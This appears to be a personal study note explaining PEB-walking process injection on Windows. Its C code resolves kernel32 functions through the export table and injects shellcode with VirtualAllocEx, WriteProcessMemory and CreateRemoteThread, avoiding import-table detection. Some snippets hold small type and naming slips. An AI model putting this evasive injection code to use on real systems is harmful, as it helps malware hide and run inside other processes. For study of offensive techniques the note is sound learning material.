---
publish: true
created: 2025-09-21T10:27:33.055+05:30
modified: 2026-03-21T11:06:53.336+05:30
published: 2026-03-21T11:06:53.336+05:30
tags:
  - EnumProcess
  - OpenProcess
  - non-volatile-register-retrieval
  - CONTAINING_RECORD
  - GetProcAddressKernel32
  - VirtualAllocEx
  - WriteProcessMemory
  - CreateRemoteThread
  - IAT
---

## Observation

Bypasses static analysis methods that rely on import table inspection. (Because you're not importing anything explicitly?)

## Working

- Retrieve PEB (using inline assembly) of the current process, which contains information about loaded modules using inline asm:

```c
 <...>
 PEB*  peb;
 <...>
  __asm {
	  mov eax, fs: [0x30]
	  mov peb, eax
  }  
```

Pretty neat huh, who would've thought that the pointer to the PEB is stored in a register for a process. (Actually, you would've thought of it if you knew to check a non-volatile register)

- Using this pointer, traverse the PEB's linked list of loaded modules to find the base address of the desired module using  `CONTAINING_RECORD(lEntry, ...)`, then iterate through the list of loaded modules in the process, and obtain its base address.
- Using the base address, retrieve the pointer to its functions using `GetProcAddressKernel32`
- Run your shellcode using pointer to `VirtualAllocEx`, `WriteProcessMemory`, and `CreateRemoteThread`.

## Preliminaries

If you're following [this PoC](https://offensive-panda.github.io/ProcessInjectionTechniques/PEB_WALK_INJECTION/), then the `PEB` structure that we require is not defined in the pre-existing Win32 APIs. They need to be defined first. And before defining the `PEB` structure, we would have to define the structures that are attributes to the `PEB` structure (`PEB_LDR_DATA`).

```c
typedef struct _PEB_LDR_DATA {
    ULONG length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;
typedef struct _PEB {
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    BOOLEAN SpareBool;
    HANDLE Mutant;
    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;
```

Note that the attributes of these structures are quite different from the ones defined in `winternl.h`.  Source: [PEB (winternl.h) - Win32 apps | Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/api/winternl/ns-winternl-peb)

```c
typedef struct _PEB_LDR_DATA {
    BYTE Reserved1[8];
    PVOID Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;
<...>
typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    PVOID Reserved4[3];
    PVOID AtlThunkSListPtr;
    PVOID Reserved5;
    ULONG Reserved6;
    PVOID Reserved7;
    ULONG Reserved8;
    ULONG AtlThunkSListPtr32;
    PVOID Reserved9[45];
    BYTE Reserved10[96];
    PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
    BYTE Reserved11[128];
    PVOID Reserved12[1];
    ULONG SessionId;
} PEB, *PPEB;
```

As we can see, the name "Reserved" indicates lack of documentation, because it holds no meaning.

Next, we need to define the function prototypes of the functions we will later utilize via PEB walking.

```c
typedef FARPROC(WINAPI* GETPROCADDRESS)(HMODULE, LPCSTR);
typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR);
typedef LPVOID(WINAPI* VAExType)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
typedef BOOL(WINAPI* WPMType)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T* lpNumberOfBytesWritten);
typedef HANDLE(WINAPI* CRTType)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, DWORD lpThreadId);
```

And then initialize the function pointers and the structures.

```c
PEB* peb;
PLDR_DATA_TABLE_ENTRY module;
LIST_ENTRY* lEntry;
HMODULE k32baseAddr = NULL;
GETPROCADDRESS ptrGetProcAddress = NULL;
LOADLIBRARYA ptrLoadLibraryA = NULL;
VAExType pVaEx;
WPMType pWPM;
CRTType pCRT;
```

Now we can [[#Working|retrieve the PEB]] and use it properly.

Here is where it really starts.

- `PEB_LDR_DATA` is a structure that contains information about the loaded modules for the process, which we have defined (again, officially undocumented). We will first retrieves this.

```c
lEntry = peb->Ldr->InLoadOrderModuleList.Flink;
```

The name is quite intuitive. "In Load Order, Module List".

- We will now look for loaded DLLs in this list. We will parse each entry and find the base address for the desired library. In our case, we are interested in `kernel32.dll` because we want to use `GetProcAddress`.

For this we can use the `CONTAINING_RECORD` macro to retrieve the base address of the table entry structure which consists of the DLL entry and its details (`LDR_DATA_TABLE_ENTRY`). We are specifically looking for the `InLoadOrderLinks` field in that entry.

```c
module = CONTAINING_RECORD(lEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
```

- We will loop this and by the end of each iteration, `lEntry` will then point to `lEntry->Flink`. Then with the new `lEntry` value (next one), we will enumerate the same structure to search for the desired DLL. If we find it, the base address will be stored.

```c
//<...loop...>
if (_stricmp(baseDllName, "kernel32.dll") == 0) {
	k32baseAddress = (HMODULE)module->DllBase;
	//Optional break statement here, if we are only looking for one function
}
//<... loop end here ...>
```

Otherwise the loop will keep iterating through each table entry until the last one.

- After retrieving the base address of the DLL in the process, we can now calculate the offsets at which the functions we need, reside. This is a bit of a complex process as we are dealing with a PE file (DLL). A function has been defined for it.

```c
PVOID GetProcAddressKernel32(HMODULE hModule, LPCSTR lpProcName)
{
    PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDOSHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    
    DWORD* pAddressOfFunctions = (DWORD*)((BYTE*)hModule + pExportDirectory->AddressOfFunctions);
    DWORD* pAddressOfNames = (DWORD*)((BYTE*)hModule + pExportDirectory->AddressOfNames);
    WORD* pAddressOfNameOrdinals = (WORD*)((BYTE*)hModule + pExportDirectory->AddressOfNameOrdinals);
    
    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++)
    {
        char* functionName = (char*)((BYTE*)hModule + pAddressOfNames[i]);
        if (strcmp(functionName, lpProcName) == 0)
        {
            return (PVOID)((BYTE*)hModule + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
        }
    }
    return NULL;
}
```

The logic goes like this...

To calculate the address of the functions, we first need to clearly define where the headers and sections reside. The first thing we need to define is the header `PIMAGE_DOS_HEADER`.

```c
PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)hModule;
```

Now we need to define `PIMAGE_NT_HEADERS`, which is at a certain offset from the DOS header we just defined.

```c
PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDOSHeader->e_lfanew);
```

The NT header's address will help us define where the export directory is (`PIMAGE_EXPORT_DIRECTORY`).

```c
PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hModule + pNTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
```

We now have the virtual address of the export table (EAT). Using this, we can now extract the address of the functions that we want to use.

```C
DWORD* pAddressOfFunctions = (DWORD*)((BYTE*)hModule + pExportDirectory->AddressOfFunctions);
DWORD* pAddressOfNames = (DWORD*)((BYTE*)hModule + pExportDirectory->AddressOfNames);
DWORD* pAddressOfNameOrdinals = (WORD*)((BYTE*)hModule + pExportDirectory->AddressOfNameOrdinals);
```

Now we can loop through the function names and find ours, then return its address

```c
// <...loop ...>
char* functionName = (char*)((BYTE*)hModule + pAddressOfNames[i]);
if (strcmp(functionName, lpProcName) == 0)
	return (PVOID)((BYTE*)hModule + pAddressOfFunctions[pAddressOfNameOrdinals[index]]);
//  <...loop ...>
```

Long story short, this function will take in the base address of the DLL and the name of the function in that DLL that we need, then return its address.

At this point we have walked the PEB.

- We will utilize the gathered information to execute Windows API functions without having them revealed in the Import Address Table (IAT)

```c
GETPROCADDRESS ptrGetProcAddress = NULL;
LOADLIBRARYA ptrLoadLibraryA = NULL;
VAExType ptrVirtualAllocEx;
WPMType ptrWriteProcessMemory;
CRTType ptrCreateRemoteThread;
LPVOID pRemoteCode = NULL;
//<...>
HANDLE hThread = NULL;
//  <... if k32baseaddress found ...>
//  <... Open some process, and if it exists ...>
ptrGetProcAddress = (GETPROCADDRESS)GetProcAddressKernel32(k32baseAddr, "GetProcAddress");  //  Get function address from PEB
ptrLoadLibraryA = (LOADLIBRARYA)GetProcAddressKernel32(k32baseAddr, "LoadLibraryA");  //  Get function address from PEB
HMODULE kernel32Base = ptrLoadLibraryA("kernel32.dll");  //  Use
ptrVirtualAllocEx = (VAExType)ptrGetProcAddress(kernel32Base, "VirtualAllocEx");  // Use
pRemoteCode = ptrVirtualAllocEx(hProcess, NULL, p_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE); //  Use   //  Storing the starting address of allocated memory region
ptrWriteProcessMemory = (WPMType)ptrGetProcAddress(kernel32Base, "WriteProcessMemory");  // Get function, but using ptrGetProcAddress, which was itself retrieved from PEB.
ptrWriteProcessMemory(hProcess, pRemoteCode, (PVOID)code, (SIZE_T)p_len, (SIZE_T*)NULL);  //  Use
ptrCreateRemoteThread = (CRTType)ptrGetProcAddress(kernel32Base, "CreateRemoteThread");  //  Get function, but using ptrGetProcAddress, which was itself retrieved from PEB.
hThread = ptrCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
```

And like this, we just ran [[Classic Code Injection Remote Process]] using PEB walking.
